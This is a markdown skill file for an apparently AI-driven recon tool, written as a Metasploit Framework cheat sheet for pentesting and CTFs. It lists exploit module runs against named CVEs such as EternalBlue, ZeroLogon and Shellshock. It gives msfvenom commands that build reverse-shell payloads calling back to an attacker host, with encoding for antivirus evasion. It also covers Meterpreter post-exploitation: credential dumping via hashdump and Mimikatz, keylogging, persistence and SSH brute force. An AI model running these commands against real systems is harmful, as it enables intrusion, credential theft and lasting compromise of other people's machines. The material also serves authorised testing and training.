<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: metasploit
description: Metasploit Framework — module selection, msfconsole workflow, msfvenom payload generation, handlers, meterpreter post-exploitation, and common exploit modules for pentest/CTF
---

# Metasploit Framework

Metasploit = exploitation framework with 2000+ modules. Use for: exploit delivery, payload generation (msfvenom), reverse shell management, and post-exploitation via Meterpreter.

**Install:**
```
sudo apt-get install -y metasploit-framework
# Start DB (required for search to work fast):
sudo systemctl start postgresql
sudo msfdb init
```

---

## msfconsole Basics

    # Start:
    msfconsole
    msfconsole -q               # Quiet mode (no banner)

    # Basic commands:
    search <keyword>            # Find modules: search ms17-010, search eternalblue
    search type:exploit name:tomcat
    search cve:2021-44228

    use <module_path>           # Load module: use exploit/windows/smb/ms17_010_eternalblue
    info                        # Show module details + all options
    show options                # Show required/optional options
    show payloads               # List compatible payloads for current module
    show targets                # List target OS/arch options

    set RHOSTS <target_ip>      # Set target
    set RPORT <port>            # Set target port
    set LHOST <attacker_ip>     # Set local IP for reverse shell
    set LPORT 4444              # Set listener port
    set PAYLOAD <payload>       # Set payload (e.g., windows/x64/meterpreter/reverse_tcp)

    check                       # Check if target is vulnerable (if module supports it)
    run                         # Execute module
    exploit                     # Same as run

    # Session management:
    sessions -l                 # List active sessions
    sessions -i 1               # Interact with session 1
    background                  # Background current session (Ctrl+Z also works)
    sessions -k 1               # Kill session 1

---

## Common Exploit Modules

### Windows

    # EternalBlue — MS17-010 (Windows 7/2008):
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS <target>
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST <attacker>
    run

    # PrintNightmare — CVE-2021-1675:
    use exploit/windows/dcerpc/cve_2021_1675_printspooler
    set RHOSTS <target>
    set LHOST <attacker>
    run

    # Rejetto HFS — CVE-2014-6287:
    use exploit/windows/http/rejetto_hfs_exec
    set RHOSTS <target>
    set RPORT 80
    run

    # ZeroLogon — CVE-2020-1472:
    use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
    set RHOSTS <dc_ip>
    set NBNAME <domain_controller_name>
    run

### Web

    # Apache Struts — S2-045:
    use exploit/multi/http/struts2_content_type_ognl
    set RHOSTS <target>
    set RPORT 8080
    set LHOST <attacker>
    run

    # Tomcat Manager WAR upload:
    use exploit/multi/http/tomcat_mgr_upload
    set RHOSTS <target>
    set HttpUsername tomcat
    set HttpPassword tomcat
    set LHOST <attacker>
    run

    # PHP CGI argument injection:
    use exploit/multi/http/php_cgi_arg_injection
    set RHOSTS <target>
    run

    # Jenkins Script Console RCE:
    use exploit/multi/http/jenkins_script_console
    set RHOSTS <target>
    set LHOST <attacker>
    run

### Linux

    # vsftpd 2.3.4 backdoor:
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOSTS <target>
    run

    # Shellshock:
    use exploit/multi/http/apache_mod_cgi_bash_env_exec
    set RHOSTS <target>
    set TARGETURI /cgi-bin/vulnerable.cgi
    run

### Post-Exploitation

    # Dump credentials:
    use post/windows/gather/credentials/credential_collector
    use post/multi/recon/local_exploit_suggester

    # Hashdump:
    use post/windows/gather/hashdump

---

## Handlers — Receiving Reverse Shells

    # Multi-handler (generic reverse shell listener):
    use exploit/multi/handler
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST <attacker>
    set LPORT 4444
    set ExitOnSession false     # Keep handler running after session
    run -j                      # Run as background job

    # Also accepts non-meterpreter shells:
    set PAYLOAD linux/x64/shell/reverse_tcp

---

## msfvenom — Payload Generation

    # List all payloads:
    msfvenom -l payloads | grep "windows/x64"
    msfvenom -l payloads | grep "linux/x64"

    # Windows x64 reverse TCP meterpreter:
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker> LPORT=4444 -f exe -o shell.exe

    # Windows x86 (32-bit):
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker> LPORT=4444 -f exe -o shell32.exe

    # Linux ELF:
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker> LPORT=4444 -f elf -o shell.elf
    chmod +x shell.elf

    # PHP webshell:
    msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker> LPORT=4444 -f raw -o shell.php

    # Python:
    msfvenom -p python/meterpreter/reverse_tcp LHOST=<attacker> LPORT=4444 -f raw -o shell.py

    # WAR (Tomcat):
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f war -o shell.war

    # PowerShell one-liner:
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker> LPORT=4444 -f psh-cmd

    # Base64-encoded:
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker> LPORT=4444 -f exe | base64

    # With encoder (basic AV evasion):
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker> LPORT=4444 \
      -e x64/xor_dynamic -i 3 -f exe -o shell_encoded.exe

---

## Meterpreter Commands

    # System info:
    sysinfo                     # OS + hostname + arch
    getuid                      # Current user
    getpid                      # Current process ID
    ps                          # Process list

    # Privilege escalation:
    getsystem                   # Auto privesc attempt (several techniques)
    getprivs                    # List privileges
    migrate <pid>               # Migrate to another process (e.g., explorer.exe)

    # File operations:
    ls                          # List directory
    cd C:\\Users
    pwd
    download C:\\Users\\admin\\Desktop\\flag.txt /home/kali/
    upload /home/kali/tool.exe C:\\Temp\\tool.exe

    # Shell:
    shell                       # Drop to cmd.exe shell
    # Ctrl+Z = background shell back to meterpreter

    # Credential extraction:
    hashdump                    # Dump local SAM hashes
    run post/windows/gather/credentials/credential_collector
    load kiwi                   # Load Mimikatz module
    creds_all                   # Dump all credentials via Kiwi/Mimikatz

    # Networking:
    ipconfig                    # Network interfaces
    route                       # Routing table
    portfwd add -l 3306 -p 3306 -r <internal_host>  # Port forward
    run auxiliary/server/socks4a  # SOCKS proxy through session

    # Persistence:
    run persistence -S -U -X -i 5 -p 4444 -r <attacker>
    # -S = startup, -U = user login, -X = system boot

    # Screenshots / keylogger:
    screenshot                  # Take screenshot
    keyscan_start               # Start keylogger
    keyscan_dump                # Dump keystrokes
    keyscan_stop

---

## Auxiliary Modules (Scanners)

    # SMB version scan:
    use auxiliary/scanner/smb/smb_version
    set RHOSTS 10.10.10.0/24
    run

    # HTTP version:
    use auxiliary/scanner/http/http_version
    set RHOSTS 10.10.10.0/24
    run

    # Credential brute force:
    use auxiliary/scanner/ssh/ssh_login
    set RHOSTS <target>
    set USER_FILE users.txt
    set PASS_FILE passwords.txt
    run

---

## Pro Tips

1. `search cve:XXXX-XXXXX` → fastest way to find module for a known CVE
2. Always `set ExitOnSession false` on handler → keeps listening after first connection
3. `migrate` to stable process (explorer.exe, svchost.exe) immediately after meterpreter session
4. `load kiwi` + `creds_all` = Mimikatz in memory without writing to disk
5. `run local_exploit_suggester` in meterpreter → automatic privesc enumeration
6. `portfwd` in meterpreter = port forwarding through session without extra tools

## Summary

Metasploit workflow: `msfconsole` → `search` CVE/service → `use` module → `set RHOSTS/LHOST/PAYLOAD` → `check` → `run` → meterpreter: `getsystem`, `hashdump`, `load kiwi`. msfvenom: generate standalone payloads for any format (exe, elf, war, php). Multi/handler = always-on reverse shell catcher for any payload.
